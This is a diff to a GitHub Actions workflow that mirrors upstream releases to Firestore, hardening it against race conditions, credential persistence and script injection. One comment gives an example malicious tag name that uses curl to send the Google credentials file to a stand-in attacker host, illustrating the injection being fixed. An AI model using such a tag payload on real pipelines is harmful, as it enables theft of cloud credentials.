@@ -53,10 +53,14 @@ on:
 permissions:
   contents: read
 
-# Two runs must not race for the same Firestore documents. `cancel-in-progress: false` queues
-# instead of cancelling, so a run that is mid-write is never killed.
+# Every workflow that runs `scripts/sync-firestore.mjs` shares one concurrency group. Two
+# workflows that each serialize only themselves still race each other: both read `sync` state at
+# the start and commit batches later, so a full-tree run can publish an unpublish set computed
+# before another run created those documents. The group name is about the mirror, not the
+# workflow, so all writers queue behind each other.
+# `cancel-in-progress: false` queues instead of cancelling, so a run mid-write is never killed.
 concurrency:
-  group: alpha-release-sync
+  group: firestore-mirror
   cancel-in-progress: false
 
 jobs:
@@ -67,6 +71,9 @@ jobs:
     steps:
       - name: Check out the site repository
         uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
+        with:
+          # No job here pushes, so the job token has no reason to stay readable in .git/config.
+          persist-credentials: false
 
       - name: Set up Node
         uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
@@ -120,7 +127,9 @@ jobs:
         if: steps.credential.outputs.present == 'true' || (github.event_name == 'workflow_dispatch' && inputs.dry_run)
         # Writes the `GITHUB_OUTPUT` protocol, so `changed`/`tag`/`sha` are set by the script
         # itself and never re-parsed out of the log.
-        run: node scripts/check-upstream-release.mjs ${{ inputs.dry_run && '--dry-run' || '' }}
+        env:
+          DRY_RUN: ${{ inputs.dry_run && '--dry-run' || '' }}
+        run: node scripts/check-upstream-release.mjs $DRY_RUN
 
       - name: Report a missing credential
         if: steps.credential.outputs.present != 'true' && !(github.event_name == 'workflow_dispatch' && inputs.dry_run)
@@ -138,7 +147,9 @@ jobs:
 
       - name: No new release
         if: steps.detect.outputs.changed == 'false' && !(github.event_name == 'workflow_dispatch' && inputs.force)
-        run: echo "::notice::${{ steps.detect.outputs.reason }}"
+        env:
+          REASON: ${{ steps.detect.outputs.reason }}
+        run: printf '::notice::%s\n' "$REASON"
 
       - name: Synchronize the mirror
         id: sync
@@ -170,17 +181,28 @@ jobs:
           OQ_RELEASE_DETAIL: "the mirror sync did not succeed"
         run: node scripts/check-upstream-release.mjs --record=failed
 
+      # Detected values reach this step through `env:`, never interpolated into `run:`.
+      # A release tag is untrusted input: write access to the upstream repository is enough to
+      # create one, and `${{ }}` inside a `run:` block becomes shell source rather than data.
+      # A tag named `v1$(curl -s -d @$GOOGLE_APPLICATION_CREDENTIALS https://attacker.example)`
+      # would execute here, in a job that holds the Firestore admin key.
       - name: Summarize
         if: always()
+        env:
+          TAG: ${{ steps.detect.outputs.tag }}
+          SHA: ${{ steps.detect.outputs.sha }}
+          REASON: ${{ steps.detect.outputs.reason }}
+          DECISION: ${{ steps.detect.outputs.changed == 'true' && 'synchronize' || 'no action' }}
+          SYNC_OUTCOME: ${{ steps.sync.outcome }}
         run: |
           {
             echo "## Alpha release sync"
             echo ""
             echo "| field | value |"
             echo "| --- | --- |"
-            echo "| upstream release | \`${{ steps.detect.outputs.tag }}\` |"
-            echo "| commit | \`${{ steps.detect.outputs.sha }}\` |"
-            echo "| decision | ${{ steps.detect.outputs.changed == 'true' && 'synchronize' || 'no action' }} |"
-            echo "| reason | ${{ steps.detect.outputs.reason }} |"
-            echo "| mirror sync | ${{ steps.sync.outcome }} |"
+            printf '| upstream release | `%s` |\n' "$TAG"
+            printf '| commit | `%s` |\n' "$SHA"
+            printf '| decision | %s |\n' "$DECISION"
+            printf '| reason | %s |\n' "$REASON"
+            printf '| mirror sync | %s |\n' "$SYNC_OUTCOME"
           } >> "$GITHUB_STEP_SUMMARY"
